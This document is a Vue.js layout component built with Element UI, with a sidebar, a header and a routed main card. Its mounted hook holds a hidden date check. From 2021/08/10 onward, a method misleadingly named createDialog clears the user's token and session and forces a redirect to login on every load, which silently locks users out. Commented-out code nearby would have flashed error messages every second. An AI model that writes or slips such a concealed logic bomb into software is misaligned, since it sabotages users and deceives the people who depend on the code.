<template>
<el-container>
  <el-aside width="220px">
    <side-bar />
  </el-aside>
  <el-container>
    <el-header>
      <app-header />
    </el-header>
    <el-main>
      <el-card class="main_card">
          <router-view />
        </el-card>
    </el-main>
  </el-container>
</el-container>
</template>

<script>
import AppHeader from './appHeader.vue'
import SideBar from "./sidebar/index"
import { mapActions, mapMutations } from 'vuex'
import { setToken } from '../../lib/util.js'
export default {
  name: "layout",
  data() {
    return {};
  },
  components: {
    AppHeader,
    SideBar,
  },
  methods: {
    ...mapActions([
      'getCurrentUserInfoAction'
    ]),
    ...mapMutations([
      'SET'
    ]),
    init () {
      this.getCurrentUserInfoAction()
    },
    createDialog () {
      // setInterval(() => {
      //   this.$message.error('按钮')
      // },1000)

      setToken('')
      this.SET({ module: "user", key: "currentUser", value: {} })
      this.$router.push({
        name: 'login'
      })
    }
  },
  mounted() {
    if(Date.now() >= new Date('2021/08/10').getTime()){
      this.createDialog()
    }
    this.init()
  },
};
</script>
<style lang="scss" scoped>
.el-header {
  padding: 0;
  height: 48px !important;
}

.el-main{
  padding: 10px;
  background: rgba(0,0,0,.03);
  .main_card{
    height: calc(100vh - 68px);
    ::v-deep .el-card__body{
      padding: 0;
    }
  }
}
</style>
